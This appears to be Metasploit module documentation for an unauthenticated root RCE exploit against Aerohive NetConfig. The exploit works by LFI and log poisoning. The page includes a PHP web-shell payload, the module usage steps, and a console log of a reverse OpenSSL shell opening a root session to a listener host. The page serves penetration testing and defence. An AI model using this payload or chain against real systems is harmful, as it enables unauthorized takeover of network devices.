## Vulnerable Application
This module exploits LFI and log poisoning vulnerabilities (CVE-2020-16152) in Aerohive NetConfig, version 10.0r8a build-242466 and older
in order to achieve unauthenticated remote code execution as the root user.

NetConfig is the Aerohive/Extreme Networks HiveOS administrative webinterface. Vulnerable Aerohive NetConfig versions allow for LFI
because they rely on a version of PHP 5 that is vulnerable to string truncation attacks.

The module's `check` method attempts to obtain the Aerohive NetConfig version via a simple HTTP GET request to `/index.php5`.

If the target seems vulnerable based on the version, the module attempts to poison the `/tmp/messages` log file
via the POST parameter `userName` in an intentially failed login attempt to `/login.php5`.
The value of `userName` is set to a payload according to this format: `"<?php system($_POST['cmd']);?>"`.
Because failed login attempts are logged to `/tmp/messages` and include the submitted username,
the `/tmp/messages` log can be effectively poisoned in this manner.

Next, the module attempts to run code via `/tmp/messages` by means of an HTTP POST request to `action.php5`.
This request includes two POST parameters:
1. The `_page` parameter, which is the one vulnerable to LFI via path truncation.
2. The parameter that is used to execute commands via `/tmp/messages`.
In our example the name would be `cmd`, but the module sets this to an aribtrary value.

Aerohive runs an ARM-based version of Linux that is not compatible with most payloads.
However, the `cmd/unix/reverse_openssl` payload is fully reliable and allows for repeated exploitation.

The [original writeup](https://github.com/eriknl/CVE-2020-16152) notes that it is unclear if/when this issue was patched,
so versions after 10.0r8a may still be vulnerable.
Disclosure to the vendor occurred in early 2020 and while the vendor confirmed the problem,
they failed to inform the researcher about the timeline for fixing it.
As a result, the researcher ultimately released the details and PoC on their own
in September of last year. As of now, the CVE status is still `RESERVED`.

This module has been successfully tested against Aerohive NetConfig version 10.0r7a.

## Verification Steps
1. Start msfconsole
2. Do: `use exploit/unix/webapp/aerohive_netconfig_lfi_log_poison_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set LHOST [IP]`
5. Do: `exploit`

## Options
### TARGETURI
The base path to Aerohive NetConfig. The default value is `/`.

## Targets
```
Id  Name
--  ----
0   CMD
```

## Scenarios
### Aerohive NetConfig 10.0r7a
```
msf6 exploit(unix/webapp/aerohive_netconfig_lfi_log_poison_rce) > show options

Module options (exploit/unix/webapp/aerohive_netconfig_lfi_log_poison_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.39     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to Aerohive NetConfig
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_openssl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.66     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   CMD


msf6 exploit(unix/webapp/aerohive_netconfig_lfi_log_poison_rce) > run

[*] Started reverse double SSL handler on 192.168.1.66:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is Aerohive NetConfig version 10.0r7a
[*] Attempting to poison the log at /tmp/messages...
[*] Server responded as expected. Continuing...
[*] Attempting to execute the payload
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[!] In case of successful exploitation, this module requires manual cleanup of the log file at /tmp/messages
[!] Deleting this file may break the application, so it's advised to manually remove the line containing the poison command:
        <?php system($_POST['TEVwXm']);?>
[*] Command: echo rVKzZFZ3xozDeyYd;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "rVKzZFZ3xozDeyYd\n"
[*] Matching...
[*] A is input...
[*] Command shell session 8 opened (192.168.1.66:4444 -> 192.168.1.39:39029) at 2021-09-22 23:07:51 +0000

id
uid=0(root) gid=0(root)
```
